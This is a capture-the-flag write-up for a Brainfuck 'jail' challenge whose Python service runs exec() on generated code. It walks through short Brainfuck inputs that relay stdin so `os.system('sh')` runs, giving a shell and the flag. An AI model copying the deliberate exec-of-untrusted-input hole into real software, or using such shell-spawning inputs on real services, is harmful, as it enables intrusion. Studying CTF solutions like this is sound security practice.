<details>
<summary>++++++++++[.,]</summary>

# bf jail write-up (WWCTF 2025)

**Name:** bf jail

**Description:** Jail but with my best friend? That doesn't sound too bad. Oh wait...

**Type:** Miscellaneous / Brainf\*ck / Code Golf

**Author:** dfoo

**File:** [chall.py](/bf%20jail/chall.py)

## Analysis

Check the code:
```python
#!/usr/bin/env python3
import sys


def bf(code):
    output = ""
    s = []
    matches = {}
    tape = [0] * 1000000
    for i, j in enumerate(code):
        if j == "[":
            s.append(i)
        if j == "]":
            m = s.pop()
            matches[m] = i
            matches[i] = m
    cp = 0
    p = 0
    while cp < len(code):
        if code[cp] == "+":
            tape[p] = (tape[p] + 1) % 256
        if code[cp] == "-":
            tape[p] = (tape[p] - 1) % 256
        if code[cp] == ",":
            c = sys.stdin.read(1)
            tape[p] = (ord(c) if c else 0) % 256
        if code[cp] == ".":
            output += chr(tape[p])
        if code[cp] == "<":
            p -= 1
        if code[cp] == ">":
            p += 1
        if code[cp] == "[":
            if not tape[p]:
                cp = matches[cp]
        if code[cp] == "]":
            if tape[p]:
                cp = matches[cp]
        cp += 1

    return output
...
```
Ok it's just brainf\*ck parser, keep reading:
```python
...
if __name__ == "__main__":
    code = input("> ")
    if len(code) > 200:
        print("200 chars max")
        sys.exit(0)
    if not all(c in set("+-<>[],.") for c in code):
        print("nope")
        exit(0)
    code = bf(code)
    exec(code)
```
Hmm, so it's golfing with brainf\*ck. It's also friendly enough to run whatever our brainf\*ck code spits out - that's promising, just get the code to generate `import os;os.system('sh')` and we get the shell.

## Attempts to solve

### 0. Golfing

Get a generator to convert the string above into brainf\*ck, and perform all the necessary cancellations and optimizations possible.

However, I'm new to golfing with brainf\*ck and ~am a lazy a\*\*~ don't want to [learn it](https://codegolf.stackexchange.com/questions/12973/tips-for-golfing-in-brainfuck) on the fly, so I need to find an easier way out.

### 1. Input

Look at the parser more carefully:
```python
        if code[cp] == ",":
            c = sys.stdin.read(1)
            tape[p] = (ord(c) if c else 0) % 256
```
That's helpful - we're allowed to enter stuff ourselves! Just get a piece of basic brainf\*ck code to relay our input to output and we're done:
```brainfuck
+[,.]
```
`+` increase the data pointer to 1 to enter the loop. The loop is kept open as long as the character has an ASCII code greater than 0 (i.e. not a null byte). We can then enter whatever we want and finish with a null byte:
```
$ nc chal.wwctf.com 6002
> +[,.]
import os 
os.system('sh')
^@
Traceback (most recent call last):
  File "/app/run", line 53, in <module>
    exec(code)
ValueError: source code string cannot contain null bytes
```
It even support multiline code now, and...

Oh... the null byte is going to enter the string too. Gotta fix that now.

### 2. Not letting the null byte in

The simplest fix is to swap `,` and `.` so the entered character is tested by `[` first. The downside is that whatever is before `[` will get put in as the first character. The first character we want is `i` with ASCII code 105, so...
```
$ nc chal.wwctf.com 6002
> +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[.,]
mport os
os.system('sh')
^@
echo Voilà!  # input
Voilà!
```
We have the shell now.

### 3. Optimize the solution

The above works, but it is:
- ugly: the first character always gets left out
- not general: if we want to change the first character (if we ever want to do this), we have to count the number of `+`s again

Then suddenly, I had a spark in my mind: `\n` is a valid Python code! The brainf\*ck code then greatly simplifies:
```brainfuck
++++++++++[.,]
```
`++++++++++` sets the data pointer to 10 (the ASCII code of `\n`), the first execution of `.` then puts down a `\n`, and the loop executes until a null byte is entered, which is discarded. With this, we finally have

## The solution
```
$ nc chal.wwctf.com 6002
> ++++++++++[.,]
import os
os.system('sh')
^@
ls  # input
flag.txt
run
cat flag.txt  # input
wwf{4n0th3r_CTF_4n0t3r_br41nfcK_ch4ll_7696bd540337f}
```
I really liked this solution. You can now run Python code as it is from a file:
```
$ nc chal.wwctf.com 6002
> ++++++++++[.,]
while True:
    print(input('> ').replace('I', 'you')
                     .replace('my', 'your')
                     .replace('am', 'are'))
^@
> 
> What am I doing with my life
What are you doing with your life
> bruh
bruh
> 
```

---
<details>
<summary>Afterthought</summary>

As the author said in the Discord chat, the uploaded version of the challenge was unfortunately the wrong version. The correct version should also blacklist `,` and certain keywords, forcing the players to golf `import os;os.system('sh')` in brainf\*ck. I feel a bit sorry about this, but hey, that's all the fun isn't it? 😉

As [@maximxlss](https://github.com/maximxlss) pointed out, the idea in [stage 1](#1-input) will work with some simple nested brackets
```brainfuck
+[,[.>]<]
```
This ended up even shorter than my final solution, and really captures the original spirit of the challenge even in this wrong version. I greatly appreciate the simplicity of this solution, so I relayed it here.

That being said, my monke brain would not have worked that out during the event tho. 🤪
</details>
</details>
